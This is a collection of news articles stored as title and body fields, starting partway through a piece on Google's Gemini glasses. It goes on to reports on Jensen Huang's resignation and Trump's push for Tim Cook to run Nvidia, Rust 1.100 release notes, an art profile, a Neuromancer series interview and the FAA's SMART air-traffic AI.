The setup here is similar to the Ray-Ban Meta glasses we've seen for a few years. There are no screens in the lenses, but you can interact with the AI system via voice or by activating the integrated camera. The experience should be similar to using Gemini Live on your phone, but it will be a lot easier to fire up the AI. You can say "Hey Gemini" or tap a touch-sensitive area of the frame to start interacting with the robot.
Since this is the same chatbot that operates across the Google ecosystem, it has access to your data and preferences. You can ask questions and get personalized answers, have Google Maps guide you by voice, or just talk with the AI to kill time. The glasses use custom open-ear speakers to limit distractions for those around you. Google notes the directional microphones should not pick up speech from other people, either.
Adding the camera feed is where things get interesting. When the AI can see what you see, it has the potential to do more work on your behalf. Google suggests asking Gemini for recommendations when looking at a bookshelf or glancing at an event poster to have the AI add it to your calendar. The glasses will also support Gemini Guided Vision, which provides conversational audio descriptions for people who are visually impaired.  The new frames are available for preorder today starting at $395.

articles.title: Trump floats Apple chairman Tim Cook as Jensen Huang’s successor
articles.body:
In the wake of the industry-shaking news of Nvidia CEO Jensen Huang’s resignation on Thursday, U.S. President Donald Trump is floating the idea that former Apple CEO Tim Cook should take over the position.
In a post on Truth Social, Trump wrote that “only one man” could take Huang’s place: Tim Cook of Apple.
“A Legend replaces a Legend!” he wrote.
Cook stepped down as Apple’s CEO on September 1, 2026, after 15 years running the company, but he’s still very much involved with Apple. While John Ternus took over as Apple’s CEO, Cook transitioned into the role of executive chairman of Apple’s board of directors, which sees him continuing to engage with global policymakers and manage international relationships, including Apple’s relations with China.
Trump is not the only one to suggest Cook as a replacement for Huang. Jeffrey Sonnenfeld, Senior Associate Dean for Leadership Studies at Yale School of Management, who studies CEO leadership and corporate governance, penned an op-ed in Time on Wednesday, suggesting Cook should be among the potential candidates. He wrote that Cook has “an unparalleled track record of succeeding a bigger-than-life founder,” in reference to Cook taking over from Apple founder Steve Jobs.
Whether or not Trump agrees with this opinion, or is simply blasting off an idea that hopped into his mind, is anyone’s guess.
“Tim Nvidia,” however, doesn’t quite have the same ring as “Tim Apple” does.

articles.title: Rust 1.100
articles.body:
Repository navigation
Language
Compiler
Platform Support
- i686-pc-windows-gnu is now a tier 2 without host tools target
- Promote wasm32-wasip3 to Tier 2
- Add new Tier 3 target powerpc64-sony-ps3
Refer to Rust's platform support page for more information on Rust's tiered platform support.
Libraries
- Stabilize custom allocators
- Map ENOTSUP to ErrorKind::Unsupported
- Fix soundness issues in std::sys::pal::sgx::waitqueue::unsafe_list
Stabilized APIs
Cargo
- Introduced Cargo's own linting system: some Cargo warnings are now emitted as lints that users can control in the [lints.cargo] table. This includes a new built-in unused dependency check via the cargo::unused_dependencies lint. docs #17298
- Introduced minimum publish age configurations, also known as dependency cooldowns. When the relevant config is set, the resolver ignores versions published more recently than that, unless they are already in Cargo.lock. (RFC 3923) docs #17335
- cargo-install: now uses the existing lockfile in the .crate tarball by default. --locked in cargo install becomes a no-op. #17388
- Cargo now uses a new directory layout for intermediate build artifacts. Tools that inspect the build directory may need to use Cargo’s JSON messages to locate build artifacts instead of relying on the build directory layout. The layout is not a stable interface and is subject to change. (build cache doc) #17354
Rustdoc
Compatibility Notes
- Closures now more precisely capture variables used in if let. This may cause new errors
- Check dyn-compatibility of trait objects in more places
- Infallible is now a type alias to !
- The never type fallback was changed to ! on all editions
- box patterns are no longer syntactically allowed
- Report Query Cycle errors in more cases when computing the layout of enums with explicit discriminants
- Always escape grapheme extenders in str::escape_debug
- Make let-else respect macro_rules expr metavariable grouping
- Iterator::{min,max}(_by_key) changed which Ord methods they use. This cannot change behaviour (other than being potentially faster) for types correctly following the Ord rules, but may impact types with inconsistent trait implementations.
- Emit an error when trying to enable SSE/AVX on an x86 (32bit or 64bit) softfloat target
- Require windowed (and exception) for Xtensa ABI
- windows-gnullvm: always link libunwind statically
- From version 1.94 up to 1.100 a number of ARMv7-A hardfloat targets required the VFPv3-D32 FPU as a minimum, as they erroneously had the d32 feature in their baseline list of features. Breakage introduced as a result of correcting this can be fixed by passing -Ctarget-feature=+d32 to Rust.
- Change "Rust" ABI on x86 to use SSE registers if they are always-available for the current target
- Make the ambiguous_glob_imported_traits lint fire in slightly more cases
- Make +fix-cortex-a53-835769 a default feature for aarch64-unknown-fuchsia
- Some impls on Box have been generalised to arbitrary allocators, which may cause new type inference errors
- The standard library now uses Unicode version 18.0.0
- WASI SDK version was bumped from 33 to 34
- On ARM targets, -Ctarget-feature/-Ctarget-cpu values that would alter the ABI are rejected as hard errors now.

articles.title: Donald Trump really wants Tim Cook to run Nvidia
articles.body:
Jensen Huang resigned this morning as Nvidia’s CEO following reports of affairs, including one with an alleged Chinese spy. Right now, the company is being led by its CFO on an interim basis. But President Donald Trump is already throwing around one person he thinks should take over the chipmaking giant: former Apple CEO Tim Cook, who stepped down from leading the company on September 1st and moved into an executive chairman role.
Donald Trump really wants Tim Cook to run Nvidia
Nvidia is looking for a new CEO, and President Trump says the former Apple CEO would be ‘a great candidate.’
Shortly after Huang’s resignation was announced today, Trump posted his idea about Cook on Truth Social: “NOW THAT Nvidia CEO JENSEN HUANG, who has done a fantastic job, has resigned, there is only one man to take his place - TIM COOK of Apple,” Trump said. “A Legend replaces a Legend!”
In a new episode of Stephen A. Smith’s Straight Shooter podcast published today, Trump made his pitch for Cook again, saying that Apple “would never be what it is today” if Steve Jobs was still “around”:
Can [Huang] be replaced?
Well, you know, the expression, Anybody can be replaced? So it’s very hard to replace him, but I had an idea this morning that I sort of just released: Tim Cook. He just sort of semi-retired from Apple. He’s done one of the greatest jobs in the history of business.
I think if Tim Cook, who built Apple… If Steve Jobs were around, Apple would never be what it is today. Tim Cook took a lot of these brilliant ideas and designs and everything else from Jobs and others, and he made it into one of the great companies of the world in a fairly short period. I think Tim Cook would be a great candidate to run Nvidia.
Apple and Nvidia didn’t immediately reply to a request for comment. Cook is well-known for his ongoing relationship with President Trump, including gifting the president a 24k gold and glass statue last year. (Trump, after Cook announced his transition plan earlier this year, posted a story about having “the head of Apple calling to ‘kiss my ass.’”)
During the podcast, Trump said he spoke to Huang yesterday and that Huang is “going through hell”:
Should [Huang] have stepped down?
Well, the big thing is, was the woman a spy, and I don’t know if that’s been determined yet, but if the woman was a spy, yes, if the woman was not a spy, perhaps it would be different.
But I can tell you this. Somehow, he’ll end up on his feet. I mean, I know him, I know him pretty well. I always thought of him as a fine man.
I spoke to him yesterday. He’s going through hell. What he feels most badly about is his wife and family. That’s what he is, really… that’s what he told me. I’m president, and he called me. And he said, What I’ve done to my wife and family is... That’s what he talked about.
Trump, on the podcast, called Huang a “tremendous talent.” Other tech leaders have also publicly supported Huang following his resignation.

articles.title: How Sky Glabush Conjures Atmospheric Landscapes in Sand and Oil Paint
articles.body:
How Sky Glabush Conjures Atmospheric Landscapes in Sand and Oil Paint
Looking at the serene paintings that emerge from Sky Glabush’ s studio, it’s easy to feel a soft breeze sliding off bare summer shoulders or hear the crunch of leaves underfoot, their parched fibers reverberating across the autumn landscape. Transportive and atmospherically charged, the landscapes harness the allure of texture to draw the viewer in and invite them to stay a while.
Raised on the west coast of British Columbia and currently based in rural Ontario, Glabush has long been attuned to the natural world. He often identifies the feelings he associates with a particular place and translates that through color and intuitive interpretations of the terrain: the spindly, strangely straight tree trunks of a forest, for example, or the ways a sunflower echoes the radial form of the sun.
Glabush typically utilizes limited palettes that adhere to just one or two color families. He also mixes oil paint with granular particles, sand being the most common, although he’s used crushed quartz and raw pigment. Originally, the idea of combining materials emerged because the artist wanted, he says, to “obliterate the image… But I realized it didn’t destroy the image. It was still present and humming under that surface layer. So it gave me the freedom of deciding what I wanted to hold on to or what I wanted to erase.”
Adding and removing has since become integral to Glabush’s practice, which involves adding thin stains of paint and turpentine to the point of the painting becoming relief-like. He tends to begin with an architectural structure that anchors the work. Sometimes a grid and others a radial arrangement, the foundational patterns inform each resulting layer. Color, though, is always “the unifying principle, it is the energy and dynamism, it is the element of surprise. Each painting often goes through several iterations of colour before deciding on a direction.”
Although he’s worked with other materials in the past and has particularly enjoyed carving, the conventions and limitations of painting always drew him back. “That period of experimentation with sculpture allowed me to treat my paintings in a more physically robust and experimental way. But even during my most experimental period, I saw myself as a painter and wanted to find a way to express myself within that language,” he tells Colossal.
Some of the works here will be on view in Glabush’s solo exhibition, If the Wild Bird Could Speak, on view from November 20 to January 9 at Alison Jacques in London. Until then, explore more of his paintings on Instagram.

articles.title: The 42-Year Journey to Bring 'Neuromancer' to the Screen
articles.body:
Briana Middleton has something to show me. “Wait!” she says just as we’re about to end our Zoom call, reaching for something just beyond her screen.
“When I found out we were going to be doing this,” she says, “I was at the thrift shop in my neighborhood and I found this.” Then she points it at the camera: an issue of WIRED from 1995 featuring Keanu Reeves on the cover alongside the line “William Gibson on the making of Johnny Mnemonic.”
Very apropos. The 1995 film Johnny Mnemonic was based on a short story by Gibson, who also wrote the screenplay. Molly, the “razorgirl” Middleton plays in Apple TV’s forthcoming Neuromancer adaptation, made her first appearance in that short story. Her relationship with the protagonist Case, played in the series by Callum Turner, mirrors the one Reeves’ Neo had with Trinity in The Matrix, which is steeped in Gibsoneque lore.
For Middleton, to be giving an interview to WIRED about Neuromancer’s epic journey to the screen not long after finding a 1995 issue of the magazine in a secondhand store is so uncanny it almost feels like a glitch. “Dude, it was eight bucks,” she says, agreeing that eight dollars is a steal for a vintage WIRED. “I was like, ‘This is crazy.’”
Maybe all things happen exactly when they’re supposed to. Gibson originally released Neuromancer in 1984, back before hackers were cool. Back before hackers were CEOs. It focused on Case, a young computer jockey who can get online through a jack in his head. He teams up with Molly and a former military man named Armitage to break into the offworld home of the Tessier-Ashpool family, who became astoundingly rich thanks to the tech company they founded.
The book’s novel ideas—cyberspace, brain-computer interfaces, all-powerful AIs—were years away from being mainstream, let alone possible. In the years since, there’s been much talk of turning Neuromancer into a movie or TV show, but it never took off, even as Hollywood mined sci-fi for hits.
On January 22, all of that will change when Apple TV releases its long-anticipated adaptation. Ahead of its release, WIRED got in touch with Middleton, Turner, and showrunners Graham Roland and JD Dillard to find out how they became the first to bring the book to screens—and the burden of taking on one of sci-fi’s classics.
On adapting an iconic sci-fi novel:
Graham Roland: It's a huge seminal book. I had not read it until the summer of 2020, but I was aware it was one of those white whales. It inspired a lot of things, and people had been trying to adapt it for years.
Callum Turner: The world will be taken on a wild ride. It’s an epic. It’s Blade Runner; it’s 2001: A Space Odyssey; it’s The Fifth Element. This is the first time it comes onto our screens, and that's a big moment for us and fans of sci-fi.
Briana Middleton: When we were shooting it and in the thick of it, it was easier to not get freaked out by the expectations. It felt nice to be in a little bubble with the world that we had created. I tried to look at the expectations that people clearly have and the love that people have for this book and what these characters mean. I definitely get freaked out sometimes and I just have to shut my computer and not think about it.
On getting the rights:
Roland: I had a meeting at Skydance, and they had given me the book and said, “Hey, the rights of this book are going to come available again. We’re going to try to adapt it as a TV show as opposed to a movie or several movies." It made so much sense. So I read the book, and really responded to it right away. JD and I had been friends for years prior to that, and were looking for a way to work together. He had also had a meeting at Skydance, and they had also given him the book.
JD Dillard: Yeah, there was a wonderful kismet of this moment, and we were like, “Wait, we’re both talking to people about this. Why don’t we do it together?”
On how Drake became a producer:
Dillard: Drake has always been a fan of Neuromancer and as a storyteller has great taste, but that's only part of it. The real magic is that he’s built an incredible team at [his production company] DreamCrew that he trusts to bring things to life once he identifies something he loves or believes in. Jason Shrier, who leads film and TV for DreamCrew, is one of the folks in our little brain trust on this show, and someone we pride as always having his finger on the pulse. But he has a relationship with [entertainment company] Anonymous Content, and Skydance, so it was kind of serendipitous that as Drake and DreamCrew had identified the books, all of these parties were starting to form and realize that they could work together to go get the rights. Drake, individually and by way of DreamCrew, is part of the mix and remains an important part of our process.
On working with William Gibson:
Roland: The way it was set up was that William Gibson was going to be the decider of who was going to get the rights when they came available. So we went to work on a pitch and with the hope that we would be the people he would choose.
We had heard that there were some bigger names, much bigger than JD and I. I just felt like there was a counterculture vibe about him and I was like, I don't think it matters that we're nobodies. I think if we can somehow communicate our passion for his book, and not just go and say, “Oh, obviously we’ll take care of your book, you can trust us,” but actually go in and do the work and come up with a thoughtful presentation and a thoughtful pitch, then I think we've got as good a shot as any.
Dillard: I'm sure Bill would not mind us sharing this part of it, but it's very easy to look at these big pieces of literature or movies that have stood the test of time and just think that they were immaculately conceived. Just to hear him talk about where he struggled and what he was self-conscious about and then what he was surprised worked and what he wished he could have done, what he wished he had time to do—it was the first time Graham and I both looked at Neuromancer as a living text.
On making Neuromancer their own:
Dillard: One of the first questions we asked ourselves was “How do you make this feel new in spite of inspiring so many things that have now already come out ahead of this?” It was never going to be our ambition to out-Cyberpunk 2077 Cyberpunk 2077. But what we could do is talk to Gibson and find out where, for him, some of those big tonal touchpoints are. An interesting one that came up really early in talking to him was that he had never perceived the world of Neuromancer as a dystopia. Even that was a nice thing to just remember as we found our way through it.
The best we could do is bring people to the experience of what it felt like reading it for the first time in 1984. Because anything beyond that, your reference points are already going to be derivative. If you put up Blade Runner reference art, you're already behind it. The joke that we were even making when hiring [production designer] Luke [Hull] was like: Here's someone who's done Chernobyl and Andor, and in our minds Neuromancer is Chernobyl plus Andor. It's old-school and hi-fi and colliding those things together.
Roland: We didn't want the world of Neuromancer to feel like X amount of years after the world that we were living in. In the teaser that opens the show, you see this piece of technology in the late '60s, early '70s that we know did not exist back then in our world. We wanted to announce right out of the gate: Don't be looking for the iteration of whatever phone you have in your pocket 50 years from now. We want this to be its own world.
Dillard: Watching someone hack will only be exciting for so long. But what is stakes-driven is the danger to Case in doing it and the toll it takes on his body. Is he going to get the thing they need for the larger story for himself? Can he prove to himself that he can still do it? All of those things were immediately stickier than just watching him do it.
A thing Bill [Gibson] said really early on is, he had always sort of imagined Case as a neurological athlete. We took that and ran with it, in that it should take a toll. There's an expenditure to do this work.
On adapting a book beloved by fans:
Turner: I try not to think about how important it is and focus on my job of playing the scenes in front of me. JD and Graham had William Gibson’s approval, the scripts were brilliant, and the world so detailed and real. You can smell this world, which feels unique.
Roland: I'm so glad that one of the first things we did was go see Bill Gibson up in Vancouver. He took the burden off of us and let us know that he wasn't expecting a literal translation of his text. He's the one that we're really beholden to.
Even in those early conversations with him, he mentioned, “Oh, I always wanted to do a bigger Tessier-Ashpool story, the story of the family [behind the powerful AI called Wintermute]. I had a book deadline, and I never really got to expand on that story. But if you find yourself looking for other things, other liberties or places to go into and make your own, that would be one.” So that's why we came up with that storyline.
On the set design:
Roland: Before we ever got to hiring the heads of any departments, JD planted a flag and said, “As much as we can, we want an in-camera aesthetic. We want to be practical.” That really drove the decision to go to Japan, because trying to recreate Chiba City, we already have set extensions, obviously, because it takes place in the future, but the textures of Japan [are there], and we wanted it to feel like you were actually there.
The other thing we did, the thing I had never done on any other show, was we hired our production designer first, before any other head of a department. We knew that while we were still writing we needed that person to help us realize the world. What they were going to do practically—from a props perspective, from a concept art perspective—was going to inform our writing as well.
Dillard: It is a very bespoke version of the future; everything had to be machined and built and designed. We didn’t have all of these things that you could normally just go to the prop shop and get. But that is what drives the feeling of Neuromancer, feeling textured and grounded and real and a place you could go to, and it is both familiar to the past but aspirational to the future.
On the design of Case’s deck, the terminal he uses to access the virtual world of the matrix:
Dillard: We saw a lot of decks. If I remember correctly, I feel like we were on the way to being like, "OK, this is the deck." Then Luke was like, "Sorry, before we make that, here's another one." That is the one we went with. But we were all resistant to it just feeling like a laptop. We wanted something that was a little bit like a station.
On getting the synth-rock band Son Lux for the score:
Dillard: Graham and I knew from the beginning we wanted Neuromancer to feel different, not feel cyberpunk. In the same way that every other department had to honor retro-futurism in their own way, we wanted to charge our composer with doing the same.
They're the best, and a band we've been fans of for a long time. I don't know how many Son Lux concerts I've gone to, and it was really cool in the last few years to see their turn into scores. Obviously, Everything Everywhere All at Once was a big one for them. Ryan [Lott] and the gang just really found Neuromancer's own sonic signature.
On casting Case:
Roland: We had finished two or three scripts, and we started having conversations about casting. Apple had had a great experience with Callum on Masters of the Air and they encouraged us to meet with him. It was the first and only meeting we had. He was in LA for something else and he came to meet JD and I, and within five minutes of hearing his voice it was like, “This is the guy.”
Turner: My vision was aligned with theirs, and luckily they asked me to join. I hadn’t read the book, but I was in a sci-fi mode. I’d read I Am Legend and Do Androids Dream of Electric Sheep? when this came through. I remember we had [Neuromancer] in our house when I was a kid, but I’d never picked it up. Graham and JD had written a wonderful character, and he felt so nuanced and detailed on the page—I jumped off from their starting point.
Case has the right mix of dangerous, courageous, and naive. Joe Strummer was a big influence. Thom Yorke. Iggy Pop. There’s an incredible documentary called Streetwise that I used as a base. There are always many, many things that go into a pot.
On maybe casting the actor who will be the next James Bond:
Dillard: We're crossing our fingers and toes.
On casting Molly:
Dillard: We had Case, so it was about “What completes the duo?” It’s a vibe thing; it’s a physicality thing. Callum's quite tall. And not that our shorter friends can't kick ass too, but you just wanted it to make sense on screen. Callum was shooting in Vancouver, and we brought a few people to read across from him. It was Briana for sure. They just had such a fun chemistry, and she just had the kind of no-nonsense grit to her. She could find these neat moments of warmth, but also not have that break her hard shell. I know everybody says this in their interviews about their show, but we really lucked out.
Middleton: I was not familiar with the book, and I had a meeting with David Levine at Anonymous Content. When he initially told me about the character and the fact that she's got lenses over her eyes, I was like, “I don't think I want to do that. That doesn't sound fun at all.” Then I met with JD and Graham months later, and they just sold me on it.
I feel like Molly is very funny in our show, and in the book, Molly is very cool, and there's a lot that we don't see that is very clearly there. Molly is a guarded character, but there is so much going on, and we do get to see some more of the very human part of her outside of the “razorgirl” badass trope.
On Molly’s razorgirl lenses:
Middleton: They were stuck on my face. It was double-sided sticky tape basically, but they held on. I think they fell off maybe once or twice throughout the entire shoot, and that includes fight scenes, so they held up. Steps were always a daunting thing. I couldn't really tell when I was going to step off something or be fine.
Whenever I took them off, it would feel weird. I would feel kind of exposed. I think at some point in the shoot, they started to feel probably how Molly feels, that they are very comforting and very much like, I can hide a little bit.
On having the jack—a brain-computer interface—attached to the back of your neck:
Turner: Actually, it was fine.
On William Gibson’s cameo as a patron at the Chatsubo dive bar:
Roland: We invited him to the set in London. I knew we had a lot of fans of his book working on our crew, but it wasn’t until he arrived that I saw the number of people that had brought their personal copy of Neuromancer hoping to get it signed. I was like, “Oh wow, I guess they're not here for the scripts.” [Laughs]
Dillard: I think we were like, “We want him to get out here, and we know it's a long slog from Vancouver, but if we can get him out here, we got to put him in. We have to just immortalize his presence in the show.” So part of it was timing, but it actually worked out for what we wanted because Chatsubo is such an iconic location in the book, and to see him there as a barfly just was like, “This will be so fun.”
On whether the other books in William Gibson’s Sprawl Trilogy—Count Zero and Mona Lisa Overdrive—could find their way onto the small screen:
Roland: It's too early to say at this point. I think we're still kind of focused on getting this one out into the world, but we'll see. I hope so.
On tech entrepreneurs being inspired by Neuromancer:
Dillard: There's some great tweet that went viral last year that is sort of like, "New tech CEO says they're launching a product called Skynet.” It's like you're missing the point if you're naming the thing after the bad thing.
Middleton: Our show is asking what happens whenever corporations have unchecked power and when a technology is unchecked and there's no regulations, and our relationship with that technology goes unchecked. Our show is asking what we lose without oversight. I think life gets much, much worse. It's scary. I'm scared.

articles.title: Let’s talk about Jensen Huang’s many affairs!
articles.body:
Usually, we’d be offering to answer your questions about a news event, but honestly we don’t really have any answers about what the hell is going on over at Nvidia. I can’t speak for Nilay but at the rate Jensen Huang’s new mistresses are dropping, I am concerned we are approaching an affair Singularity. If things don’t decelerate soon, we may be looking at existential risk. Maybe the future of AI really does depend on Jensen’s sex life, but not in the way I was thinking!
Let’s talk about Jensen Huang’s many affairs!
What a week today has been!
What a week today has been!
As much fun (?) as we are having with all the assorted ladies, it’s important to stay focused on what’s really important: Chips and China. President Donald Trump was reportedly warned about Alice “No Relation” Huang’s possible connections to China’s spy apparatus last year, and again before his China trip in May. Nvidia reportedly intervened into a Commerce Department investigation into Alice’s company.
Did Alice girlboss too close to the sun? Have I been wrong all this time about AI being an important productivity tool, freeing everyone up to have multiple affairs at once? What do CEOs do at their jobs anyway? Is Jensen’s leather jacket really an alien symbiote? Can’t I just go for a hike in peace? Let’s discuss. Nilay and I will be joining you at 1PM ET.

articles.title: FAA Expands AI Advice to Manage Air Traffic Congestion Across Entire US Airspace
articles.body:
FAA Expands AI Advice to Manage Air Traffic Congestion Across Entire US Airspace 24
			
		 	
				The FAA is expanding its $875 million AI-powered SMART system to all 22 U.S. air traffic control centers across the country. Since being implemented over Washington, DC, on September 21, the system has helped reroute 180 flights, saving an average of 10 minutes and nearly 80 gallons of fuel per flight. Ars Technica reports:  The FAA fact sheet describes SMART as a cloud-based system that combines information about "weather patterns, flight paths, traffic flow and controller staffing metrics" to predict air traffic patterns. It is designed to make scheduling recommendations, identify optimal flight routes, and determine the best order of arrivals for aircraft. However, a human team of FAA specialists based in DC is ultimately responsible for validating the SMART system recommendations before passing them along to air traffic control facilities across the country, according to the agency. Furthermore, the AI-powered SMART system "cannot be used to replace the critical role air traffic controllers play or take over control of an aircraft," the FAA clarified in the September 21 announcement about the initial deployment. Local air traffic controllers can decide whether or not to accept the SMART system recommendations.
[...] Following the initial deployment in airspace above DC, the FAA expanded the SMART system's coverage to air route traffic control centers in Atlanta along with Jacksonville and Miami in Florida, according to The Dallas Morning News. The FAA also shared an example with The Dallas Morning News about how SMART recommended a shorter and faster route for a cargo flight arriving at Dallas-Fort Worth International Airport, although the newspaper noted that the agency did not identify the flight involved and has not provided information about how SMART may have assisted passenger flight traffic.
